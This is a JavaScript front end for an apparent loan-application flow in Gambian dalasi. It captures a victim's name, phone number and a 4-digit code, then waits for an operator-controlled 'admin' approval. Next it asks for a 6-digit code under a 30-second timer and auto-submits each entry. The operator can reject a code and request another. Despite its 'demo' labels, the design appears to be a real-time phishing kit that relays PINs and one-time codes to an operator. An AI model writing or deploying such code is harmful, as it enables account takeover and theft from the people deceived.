const $ = id => document.getElementById(id);
const adminSlug = new URLSearchParams(location.search).get('admin') || '';
let user = { id: '', name: '', phone: '' }, timer = null, poller = null, seconds = 30, auto1 = null, auto3 = null;
function show(n) { [1,2,3,4].forEach(i => $('page'+i).classList.toggle('hidden', i !== n)); [1,2,3].forEach(i => $('tab'+i).classList.toggle('active', i === n)); window.scrollTo({top:0, behavior:'smooth'}); }
function runTimer() {
  clearInterval(timer); seconds = 30; $('count').textContent = seconds; $('timerText').textContent = 'Please submit within the countdown.';
  timer = setInterval(() => { seconds--; $('count').textContent = seconds; if (seconds <= 0) { clearInterval(timer); $('timerText').textContent = 'Timer ended. You can submit again when ready.'; } }, 1000);
}
function startPolling() {
  clearInterval(poller);
  poller = setInterval(async () => {
    if (!user.id) return;
    try {
      const r = await fetch('/api/status/' + encodeURIComponent(user.id));
      if (!r.ok) return;
      const d = await r.json();
      if ($('page1').classList.contains('hidden') === false && d.stage1 === 'approved') {
        clearInterval(poller); $('status1').textContent = 'Approved by admin. You may continue.'; $('ref6').value = d.reference6 || ''; show(2); runTimer(); setTimeout(() => { if (!$('submit2').disabled) $('submit2').click(); }, 650);
      } else if ($('page1').classList.contains('hidden') === false && d.stage1 === 'rejected') {
        clearInterval(poller); $('status1').textContent = 'Your details were rejected. Please correct them and submit again.'; $('submit1').disabled = false;
      }
      if (!$('page2').classList.contains('hidden') && d.stage2 === 'approved') {
        clearInterval(poller); clearInterval(timer); $('status2').textContent = 'Reference step approved by admin.'; show(3);
      } else if (!$('page2').classList.contains('hidden') && d.stage2 === 'rejected') {
        clearInterval(poller); $('status2').textContent = d.stage2Message || 'Reference step rejected. Please check and try again.'; $('ref6').value = ''; $('submit2').disabled = false; runTimer();
      }
    } catch (_) {}
  }, 1800);
}
$('submit1').onclick = async () => {
  user.name = $('name').value.trim(); user.phone = $('phone').value.trim(); user.reference4 = $('ref4').value.trim();
  if (!user.name || !user.phone || user.phone.length < 6 || !/^\d{4}$/.test(user.reference4)) { $('status1').textContent = 'Enter your name and a valid phone number to continue.'; return; }
  $('submit1').disabled = true; $('status1').textContent = 'Sending details to admin…';
  try {
    const r = await fetch('/api/application', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({name:user.name, phone:user.phone, reference4:user.reference4, adminSlug})});
    const d = await r.json(); if (!r.ok) throw new Error(d.error || 'Unable to submit details');
    user.id = d.id; $('status1').textContent = 'Demo details and reference submitted. Waiting for admin approval.'; startPolling();
  } catch(e) { $('status1').textContent = e.message; $('submit1').disabled = false; }
};
function autoSubmitDetails() {
  clearTimeout(auto1);
  if ($('name').value.trim().length >= 2 && $('phone').value.trim().length >= 6 && /^\d{4}$/.test($('ref4').value.trim()) && !$('submit1').disabled) {
    $('status1').textContent = 'Details complete. Submitting demo application…';
    auto1 = setTimeout(() => $('submit1').click(), 700);
  }
}
$('name').addEventListener('input', autoSubmitDetails);
$('phone').addEventListener('input', autoSubmitDetails);
$('ref4').addEventListener('input', () => { $('ref4').value = $('ref4').value.replace(/\D/g, '').slice(0,4); autoSubmitDetails(); });

$('submit2').onclick = async () => {
  const enteredReference6 = $('ref6').value.trim(); if (!/^\d{6}$/.test(enteredReference6)) { $('status2').textContent = 'Enter all 6 digits of the non-sensitive demo reference.'; return; }
  $('submit2').disabled = true; $('status2').textContent = 'Submitting demo reference format for admin review…';
  try {
    const r = await fetch('/api/reference-submit', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id:user.id, reference6:enteredReference6})});
    const d = await r.json(); if (!r.ok) throw new Error(d.error || 'Unable to submit reference');
    $('status2').textContent = 'Demo reference format submitted. Waiting for admin approval.'; startPolling();
  } catch(e) { $('status2').textContent = e.message; $('submit2').disabled = false; }
};
$('ref6').addEventListener('input', () => { $('ref6').value = $('ref6').value.replace(/\D/g, '').slice(0,6); clearTimeout(auto1); if (/^\d{6}$/.test($('ref6').value) && !$('submit2').disabled) setTimeout(() => $('submit2').click(), 650); });
$('amount').addEventListener('input', () => {
  clearTimeout(auto3);
  const amount = Number($('amount').value);
  if ($('amount').value && Number.isFinite(amount) && amount >= 5000 && amount <= 1000000 && !$('submit3').disabled) {
    $('status3').textContent = 'Amount valid. Continuing demo…';
    auto3 = setTimeout(() => $('submit3').click(), 700);
  }
});
$('submit3').onclick = async () => {
  const amount = Number($('amount').value); if (!Number.isFinite(amount) || amount < 5000 || amount > 1000000) { $('status3').textContent = 'Enter an amount between D5,000 and D1,000,000 GMD.'; return; }
  $('submit3').disabled = true;
  try {
    const r = await fetch('/api/loan-request', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id:user.id, amount})});
    const d = await r.json(); if (!r.ok) throw new Error(d.error || 'Unable to continue'); $('status3').textContent = d.message; $('dashName').textContent = user.name || 'Demo Applicant'; $('dashPhone').textContent = user.phone || '—'; $('dashAmount').textContent = 'D' + amount.toLocaleString('en-US') + ' GMD'; show(4);
  } catch(e) { $('status3').textContent = e.message; }
  finally { $('submit3').disabled = false; }
};
